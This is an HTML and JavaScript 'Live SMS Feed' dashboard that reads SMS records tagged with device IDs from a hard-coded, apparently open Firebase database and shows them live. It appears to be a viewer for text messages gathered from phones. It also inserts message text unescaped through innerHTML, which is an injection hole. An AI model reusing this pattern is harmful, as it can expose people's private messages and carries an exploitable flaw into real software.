<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live SMS Dashboard - Fast</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.2s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .meta {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #10b981;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .time {
            color: #94a3b8;
            font-weight: normal;
        }
        .msg {
            margin: 0;
            line-height: 1.5;
            white-space: pre-wrap;
            font-size: 0.95rem;
        }
        .info {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #334155;
            padding-top: 5px;
        }
        .error {
            color: #ef4444;
            padding: 20px;
            text-align: center;
        }
        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #334155;
            border-top: 2px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-badge {
            font-size: 0.75rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
        }
        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h2>📱 Live SMS Feed</h2>
            <div>
                <span id="counter" class="status-badge">Loading...</span>
                <span id="status" class="status-badge">⏳ Connecting</span>
            </div>
        </div>
        <div id="sms-container">
            <div class="loading">
                <span class="spinner"></span>
                Loading messages...
            </div>
        </div>
    </div>

    <script>
        const container = document.getElementById('sms-container');
        const counter = document.getElementById('counter');
        const statusBadge = document.getElementById('status');

        let messageIds = new Set();
        let allMessages = [];

        function createSmsCard(sms) {
            const sender = sms.sender || "Unknown";
            const message = sms.message || "";
            const time = sms.time || "N/A";
            const info = sms.info || "";
            const deviceId = sms.deviceId || "";
            const uniqueId = `${time}_${sender}_${message.substring(0, 20)}`;

            const card = document.createElement('div');
            card.className = 'sms-card';
            card.dataset.id = uniqueId;
            card.innerHTML = `
                <div class="meta">
                    <span>📨 ${sender}</span>
                    <span class="time">🕐 ${time}</span>
                </div>
                <p class="msg">${message}</p>
                ${info ? `<div class="info">⚙️ ${info}</div>` : ''}
                ${deviceId ? `<div class="info">📱 ${deviceId}</div>` : ''}
            `;
            return card;
        }

        function renderMessages(messages, prepend = false) {
            if (!messages || messages.length === 0) return;

            // Sort by time string descending (Newest First)
            const sorted = [...messages].sort((a, b) => {
                if (a.time > b.time) return -1;
                if (a.time < b.time) return 1;
                return 0;
            });

            if (!prepend) {
                allMessages = sorted;
                messageIds = new Set(sorted.map(m => `${m.time}_${m.sender}_${(m.message || '').substring(0, 20)}`));
                container.innerHTML = '';
            }

            const fragment = document.createDocumentFragment();
            
            if (prepend) {
                let newCount = 0;
                for (const sms of sorted) {
                    const id = `${sms.time}_${sms.sender}_${(sms.message || '').substring(0, 20)}`;
                    if (!messageIds.has(id)) {
                        messageIds.add(id);
                        allMessages.push(sms);
                        fragment.appendChild(createSmsCard(sms));
                        newCount++;
                        if (newCount > 5) break;
                    }
                }
                if (fragment.children.length > 0) {
                    container.prepend(fragment);
                }
            } else {
                for (const sms of sorted) {
                    fragment.appendChild(createSmsCard(sms));
                }
                container.appendChild(fragment);
            }

            counter.textContent = `${allMessages.length} messages`;
            statusBadge.textContent = '🔴 Live';
            statusBadge.className = 'status-badge live';
        }

        // Target your exact REST link: /common/smsData.json
        async function loadViaREST() {
            try {
                statusBadge.textContent = '⏳ Loading REST...';
                const response = await fetch(
                    'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/common/smsData.json'
                );
                
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                const data = await response.json();
                
                if (!data) {
                    container.innerHTML = '<div class="error">📭 No data found under /common/smsData</div>';
                    counter.textContent = '0 messages';
                    return;
                }

                const messages = Object.values(data);
                console.log(`✅ REST loaded ${messages.length} messages`);
                renderMessages(messages);
                
            } catch (error) {
                console.warn('REST API failed, falling back to Firebase:', error);
                statusBadge.textContent = '⏳ Fallback...';
            }
        }

        async function setupFirebase() {
            try {
                const { initializeApp } = await import(
                    'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js'
                );
                const { getDatabase, ref, onValue } = await import(
                    'https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js'
                );

                const app = initializeApp({
                    databaseURL: "https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app"
                });
                const db = getDatabase(app);
                
                // Set the real-time reference to the exact folder 'common/smsData'
                const smsRef = ref(db, 'common/smsData');

                onValue(smsRef, (snapshot) => {
                    const data = snapshot.val();
                    if (!data) return;

                    const messages = Object.values(data);
                    console.log(`🔄 Firebase update: ${messages.length} messages`);

                    if (allMessages.length > 0) {
                        renderMessages(messages, true);
                    } else {
                        renderMessages(messages);
                    }
                    
                    statusBadge.textContent = '🔴 Live';
                    statusBadge.className = 'status-badge live';

                }, (error) => {
                    console.warn('Firebase listener error:', error);
                    statusBadge.textContent = '⚠️ Polling';
                });

            } catch (error) {
                console.warn('Firebase failed, falling back to polling:', error);
                statusBadge.textContent = '⏳ Polling...';
                
                // Polling path fallback fix
                setInterval(async () => {
                    try {
                        const res = await fetch(
                            'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/common/smsData.json'
                        );
                        const data = await res.json();
                        if (data) {
                            const messages = Object.values(data).slice(0, 50);
                            renderMessages(messages, true);
                        }
                    } catch (e) {
                        console.warn('Polling error:', e);
                    }
                }, 5000);
            }
        }

        async function init() {
            const restPromise = loadViaREST();
            const firebasePromise = setupFirebase();
            await Promise.allSettled([restPromise, firebasePromise]);
        }

        init();
    </script>
</body>
</html>
